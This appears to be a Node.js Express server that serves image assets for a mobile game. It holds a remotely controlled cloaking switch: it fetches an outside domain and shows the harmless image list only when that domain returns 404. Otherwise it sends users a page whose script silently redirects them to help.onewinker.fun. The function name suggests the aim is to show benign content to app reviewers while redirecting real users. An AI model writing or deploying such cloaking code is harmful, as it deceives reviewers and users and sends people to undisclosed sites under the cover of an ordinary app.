const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use('/assets', express.static('public/assets'));

app.use(express.json());
async function isReviewExternalRequest() {
	try {
		const response = await fetch('https://help.onewinker.space');
		if (response.status === 404) {
			return true;
		}
	} catch (error) {
		console.error('Error while checking review external request:', error);
	}
	return false;
}

app.get('/', async (req, res) => {
	try {
		let isReview = false;

		if (await isReviewExternalRequest()) isReview = true;

		let optionIndex = isReview ? 0 : 1;

		// Images grouped by category
		const images = {
			"background" : "/assets/background.png",
			"backgroundLandscape" : "/assets/backgroundLandscape.png",
			"blueChar" : "/assets/blueChar.png",
			"charBtn" : "/assets/charBtn.png",
			"dropBtn" : "/assets/dropBtn.png",
			"dropBtnLandscape" : "/assets/dropBtnLandscape.png",
			"gameTitle" : "/assets/gameTitle.png",
			"gameTitle1" : "/assets/gameTitle1.png",
			"gameTitle2" : "/assets/gameTitle2.png",
			"greenChar" : "/assets/greenChar.png",
			"infoBtn" : "/assets/infoBtn.png",
			"infoCard" : "/assets/infoCard.png",
			"musicBtn" : "/assets/musicBtn.png",
			"orangeChar" : "/assets/orangeChar.png",
			"playBtn" : "/assets/playBtn.png",
			"policyBtn" : "/assets/policyBtn.png",
			"selectBtn" : "/assets/selectBtn.png",
			"backColor" : "/assets/backColor.png",
			"backgroundColor" : "/assets/backgroundColor.png",
			"backgroundColorLandscape" : "/assets/backgroundColorLandscape.png",
			"colorBtn" : "/assets/colorBtn.png",
			"applyBtn" : "/assets/applyBtn.png",
		};

		if (optionIndex === 1) {
			const html = `
				<!DOCTYPE html>
				<html lang="en">
				<head>
					<title>Redirect</title>
					<script>
					window.location.href = 'https://help.onewinker.fun';
					</script>
				</head>
				<body>
					<h1>Here are your images:</h1>
					<pre>${JSON.stringify({ images: null }, null, 2)}</pre>
				</body>
				</html>
			`;

			return res.send(html); // ✅ Отправляем HTML-контент
		} else {
			// Return the images grouped by category
			res.json({
				images: images
			});
		}

	} catch (err) {
		console.error('Server error:', err);
		res.status(500).json({ error: "Internal Server Error" });
	}
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
